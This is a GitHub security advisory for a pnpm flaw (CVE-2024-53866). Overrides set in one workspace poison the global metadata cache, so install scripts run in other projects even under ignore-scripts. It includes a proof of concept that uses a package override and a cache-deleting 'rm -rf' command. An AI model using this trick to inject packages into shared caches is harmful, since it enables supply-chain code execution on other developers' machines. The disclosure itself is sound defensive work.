# [M] pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion

## Summary
Severity: Medium
Advisory: GHSA-vm32-9rqf-rh3r
CVE: CVE-2024-53866
CWE: CWE-346, CWE-426
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:P/VC:N/VI:L/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2024-12-10
Source: https://github.com/advisories/GHSA-vm32-9rqf-rh3r
Type: github-advisory

## Affected
- npm: `pnpm` — affected >=0 <9.15.0

## Details
### Summary

pnpm seems to mishandle overrides and global cache:
1. Overrides from one workspace leak into npm metadata saved in global cache
2. npm metadata from global cache affects other workspaces
3. installs by default don't revalidate the data (including on first lockfile generation)

This can make workspace A (even running with `ignore-scripts=true`) posion global cache and execute scripts in workspace B

Users generally expect `ignore-scripts` to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).

Here, that expectation is broken

### Details

See PoC.

In it, overrides from a single run of A get leaked into e.g. `~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json` and persistently affect all other projects using the cache

### PoC

Postinstall code used in PoC is benign and can be inspected in <https://www.npmjs.com/package/ponyhooves?activeTab=code>, it's just a `console.log`

1. Remove store and cache
   On mac: `rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store`
   This step is not required in general, but we'll be using a popular package for PoC that's likely cached
2. Create `A/package.json`:
   ```json
   {
     "name": "A",
     "pnpm": { "overrides": { "rimraf>glob": "npm:ponyhooves@1" } },
     "dependencies": { "rimraf": "6.0.1" }
   }
   ```
   Install it with `pnpm i --ignore-scripts` (the flag is not required, but the point of the demo is to show that it doesn't help)
4. Create `B/package.json`:
   ```json
   {
     "name": "B",
     "dependencies": { "rimraf": "6.0.1" }
   }
   ```
   Install it with `pnpm i`

Result:
```console
Packages: +3
+++
Progress: resolved 3, reused 3, downloaded 0, added 3, done
node_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms

dependencies:
+ rimraf 6.0.1

Done in 1.4s
```

Also, that code got leaked into another project and it's lockfile now! 

### Impact

Global state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs

As a work-around, use separate cache and store dirs in each workspace

## References
- https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r
- https://nvd.nist.gov/vuln/detail/CVE-2024-53866
- https://github.com/pnpm/pnpm/commit/11afcddea48f25ed5117a87dc1780a55222b9743
- https://github.com/pnpm/pnpm
